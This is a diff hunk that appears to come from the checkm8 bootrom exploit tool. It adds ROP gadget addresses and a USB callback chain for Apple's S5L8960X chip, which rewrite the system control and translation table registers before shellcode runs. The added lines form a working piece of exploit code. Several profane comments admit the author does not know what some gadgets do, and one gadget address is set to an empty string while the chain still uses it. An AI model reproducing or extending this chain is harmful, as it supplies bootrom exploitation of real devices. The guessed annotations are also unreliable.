@@ -230,6 +230,30 @@ def payload(cpid):
         PAYLOAD_SIZE_ARM64, # 7 - PAYLOAD_SIZE
                0x180086C70, # 8 - PAYLOAD_PTR
     ]
+    s5l8960x_load_write_gadget = ""
+    s5l8960x_write_sctlr_gadget       = 0x100000370 # gadget to write to system control register? (x)
+    s5l8960x_func_gadget              = 0x10000A9AC # i have no god damn clue what this is for
+    s5l8960x_write_ttbr0              = 0x1000003a4 # write to translation table base register 0? (x)
+    s5l8960x_tlbi                     = 0x100000414 # translation lookaside buffer invalid. used as an alias of sys (x)
+    s5l8960x_dc_civac                 = 0x1000004D0 # (d)ata or unified (c)ache line (c)lean and (i)nvalidate by (va) to po(c)
+    s5l8960x_dmb                      = 0x100000454 # data memory barrier instruction. (x)
+    s5l8960x_handle_interface_request = 0x10000BCCC # no fucking clue
+    s5l8960x_callbacks = [
+      (s5l8960x_dc_civac, 0x18001C800), # (d)ata or unified (c)ache line (c)lean and (i)nvalidate by (va) to po(c)
+      (s5l8960x_dc_civac, 0x18001C840), # (d)ata or unified (c)ache line (c)lean and (i)nvalidate by (va) to po(c)
+      (s5l8960x_dc_civac, 0x18001C880), # (d)ata or unified (c)ache line (c)lean and (i)nvalidate by (va) to po(c)
+      (s5l8960x_dmb, 0), # data memory barrier instruction.
+      (s5l8960x_write_sctlr_gadget, 0x100D), # gadget to write to system control register?
+      (s5l8960x_load_write_gadget, 0x18001C000), # gadget to...write things i guess?
+      (s5l8960x_load_write_gadget, 0x18001C010), # gadget to...write things i guess?
+      (s5l8960x_write_ttbr0, 0x180020000), # write to translation table base register 0?
+      (s5l8960x_tlbi, 0), # translation lookaside buffer invalid. used as an alias of sys
+      (s5l8960x_load_write_gadget, 0x18001C020), # gadget to...write things i guess?
+      (s5l8960x_write_ttbr0, 0x18000C000), # write to translation table base register 0 but...different?
+      (s5l8960x_tlbi, 0), # translation lookaside buffer invalid. used as an alias of sys
+      (0x18001C800, 0), # no fucking clue
+    ]
+    s5l8960x_callback_data = usb_rop_callbacks(0x18001C020, s5l8960x_func_gadget, s5l8960x_callbacks)
     s5l8960x_handler   = asm_arm64_x7_trampoline(0x10000CFB4) + asm_arm64_branch(0x10, 0x0) + prepare_shellcode('usb_0xA1_2_arm64', constants_usb_s5l8960x)[4:]
     s5l8960x_shellcode = prepare_shellcode('checkm8_arm64', constants_checkm8_s5l8960x)
     assert len(s5l8960x_shellcode) <= PAYLOAD_OFFSET_ARM64
